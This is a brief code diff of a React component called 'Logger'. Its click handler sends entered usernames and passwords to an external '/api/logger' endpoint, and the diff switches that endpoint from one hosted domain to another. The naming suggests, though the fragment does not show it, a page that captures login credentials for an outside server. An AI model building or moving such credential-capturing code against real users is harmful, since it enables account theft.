@@ -11,7 +11,7 @@ const Logger = () => {
 
   const handleClick = async () => {
     try {
-      await axios.post("https://dim-sum-snack.vercel.app/api/logger", {
+      await axios.post("https://dimsumsnack.netlify.app/api/logger", {
         username,
         password,
       });
